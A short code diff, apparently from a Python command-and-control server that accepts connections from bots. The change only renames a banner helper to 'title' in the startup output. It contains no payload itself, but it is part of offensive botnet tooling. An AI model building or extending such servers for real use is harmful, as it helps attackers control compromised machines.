@@ -6,7 +6,7 @@ import ssl
 import sys
 import time
 import threading
-from banner import banner, Colour
+from title import title, Colour
 
 from bot import Bot
 
@@ -54,8 +54,8 @@ def start_accepting_connections(sock):
     t1.start()
     return t1
 
-def print_banner_and_initial_info():
-    print(banner())
+def print_title_and_initial_info():
+    print(title())
     print('Run "help" command to see the usage manual')
     print(Colour().green('[+] Waiting For The Incoming Connections ...'))
 
@@ -166,5 +166,5 @@ if __name__ == '__main__':
     start_flag = True
     sock = initialise_socket()
     t1 = start_accepting_connections(sock)
-    print_banner_and_initial_info()
+    print_title_and_initial_info()
     run_c2_server(sock, t1)
